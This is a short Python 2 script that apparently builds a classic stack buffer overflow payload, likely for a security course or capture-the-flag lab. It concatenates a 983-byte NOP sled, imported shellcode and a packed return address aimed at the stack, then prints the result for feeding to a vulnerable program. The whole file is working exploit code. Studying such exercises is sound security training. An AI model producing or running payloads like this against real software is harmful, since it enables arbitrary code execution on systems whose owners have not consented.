from shellcode import shellcode
from struct import pack

nop_pad = "\x90"*983
addr = 0xbffefae0 #0xbffea205

print nop_pad + shellcode + pack("<I", addr)
